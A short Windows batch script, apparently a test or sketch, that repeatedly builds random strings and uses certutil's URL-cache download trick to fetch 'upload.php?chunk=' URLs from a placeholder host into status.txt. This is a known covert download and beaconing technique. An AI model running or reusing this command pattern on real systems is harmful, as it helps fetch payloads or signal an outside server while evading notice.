@Echo Off
Setlocal EnableDelayedExpansion
Set _RNDLength=32
Set _Alphanumeric=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789
Set _Str=%_Alphanumeric%987654321

set loopcount=5
:loop
set /a loopcount=loopcount-1
if %loopcount%==0 goto exitloop

:_LenLoop
IF NOT "%_Str:~18%"=="" SET _Str=%_Str:~9%& SET /A _Len+=9& GOTO :_LenLoop
SET _tmp=%_Str:~9,1%
SET /A _Len=_Len+_tmp
Set _count=0
SET _RndAlphaNum=
:_loop
Set /a _count+=1
SET _RND=%Random%
Set /A _RND=_RND%%%_Len%
SET _RndAlphaNum=!_RndAlphaNum!!_Alphanumeric:~%_RND%,1!
If !_count! lss %_RNDLength% goto _loop
Echo Random string is !_RndAlphaNum!

Set _Url=http://xxx/upload.php?chunk=
Set _Ur="!_Url!!_RndAlphaNum!"

Echo !_Ur!

Set _Cert=certutil -urlcache -split -f
Set _File=status.txt
Set _Cmd=!_Cert! !_Ur! !_File!
Echo !_Cmd!

!_Cmd!
timeout 2 > NUL

goto loop

:exitloop
